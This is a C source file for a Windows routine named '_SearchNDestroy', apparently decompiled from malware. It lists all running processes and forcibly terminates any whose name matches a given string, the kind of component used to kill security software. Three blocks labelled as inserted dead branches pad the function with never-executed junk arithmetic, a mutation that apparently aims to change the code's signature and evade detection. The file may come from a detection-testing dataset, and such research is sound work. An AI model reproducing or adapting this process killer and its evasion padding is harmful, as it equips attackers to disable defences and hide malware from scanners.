#include "data_globals.h"
#include <windows.h>
#include <string.h>
#include <stdlib.h>   // for malloc/free

#pragma optimize("", off)
void _SearchNDestroy(char *param_1)
{
    HANDLE snapshot;
    PROCESSENTRY32 pe32;
    HANDLE process_handle;

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char user_buf[128];
        DWORD user_len = sizeof(user_buf);
        GetSystemInfo(&si);
        GetLocalTime(&st);
        if (GetUserNameA(user_buf, &user_len)) {
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                hash += si.dwNumberOfProcessors + st.wHour;
            }
            hash ^= user_buf[0];
            // read existing local (no modification)
            volatile size_t param_len = param_1 ? strlen(param_1) : 0;
            hash += (DWORD)param_len;
            volatile DWORD j = 0;
            while (j < 2) {
                hash = (hash << 5) - hash + si.dwPageSize;
                j++;
            }
            memset(user_buf, 0, sizeof(user_buf));
        }
    }

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot == INVALID_HANDLE_VALUE)
        return;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &pe32)) {
        do {
            // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
            if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
                char *tmp = (char *)malloc(64);
                if (tmp != NULL) {
                    strcpy(tmp, "dummy");
                    volatile DWORD len = strlen(tmp);
                    volatile BYTE check = 0;
                    for (volatile DWORD i = 0; i < len; i++) {
                        check ^= tmp[i];
                    }
                    volatile DWORD j = 0;
                    while (j < 2) {
                        // read existing locals (no modification)
                        check += j + (DWORD)pe32.szExeFile[0];
                        j++;
                    }
                    char tmp2[32];
                    memcpy(tmp2, tmp, 4);
                    volatile DWORD val = (DWORD)tmp2[0] + check;
                    val += len;
                    free(tmp);
                }
            }

            process_handle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pe32.th32ProcessID);
            if (process_handle != NULL) {
                if (strstr(pe32.szExeFile, param_1) != NULL) {
                    TerminateProcess(process_handle, 0);
                }
                CloseHandle(process_handle);
            }
        } while (Process32Next(snapshot, &pe32));
    }

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    volatile DWORD dummy_tick_3 = GetTickCount();
    if ((dummy_tick_3 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_3 & 0x80000000) != 0) {
        volatile DWORD dummy_array[4];
        for (volatile DWORD i = 0; i < 4; i++) {
            dummy_array[i] = i * 0x811C9DC5;
        }
        volatile DWORD hash = 0;
        for (volatile DWORD i = 0; i < 4; i++) {
            hash ^= dummy_array[i];
            hash = (hash << 5) - hash;
        }
        volatile DWORD extra_val = 0;
        for (volatile DWORD i = 0; i < 2; i++) {
            extra_val += (hash >> i) & 0xFF;
        }
        extra_val ^= dummy_array[3];
        // read existing local (no modification)
        extra_val += (DWORD)process_handle;
        memset(dummy_array, 0, sizeof(dummy_array));
    }

    CloseHandle(snapshot);
}
#pragma optimize("", on)
